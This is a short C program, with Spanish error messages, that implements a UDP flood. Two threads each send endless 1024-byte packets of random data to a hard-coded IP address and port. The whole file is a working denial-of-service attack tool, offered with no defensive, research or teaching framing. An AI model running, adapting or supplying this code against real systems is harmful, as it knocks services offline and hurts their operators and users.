#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>

#define PACKET_SIZE 1024
#define TARGET_IP "144.76.58.217"
#define TARGET_PORT 31009

void *send_udp_packets(void *arg) {
    int sockfd;
    struct sockaddr_in target_addr;
    char data[PACKET_SIZE];

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Error al crear socket");
        pthread_exit(NULL);
    }

    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);

    if (inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr) <= 0) {
        perror("Error al configurar la dirección IP");
        close(sockfd);
        pthread_exit(NULL);
    }

    srand(time(NULL));

    while (1) {
        for (int i = 0; i < PACKET_SIZE; i++) {
            data[i] = rand() % 256;
        }
        sendto(sockfd, data, PACKET_SIZE, 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
    }

    close(sockfd);
    pthread_exit(NULL);
}

int main() {
    pthread_t thread1, thread2;

    pthread_create(&thread1, NULL, send_udp_packets, NULL);
    pthread_create(&thread2, NULL, send_udp_packets, NULL);

    pthread_join(thread1, NULL);
    pthread_join(thread2, NULL);

    return 0;
}
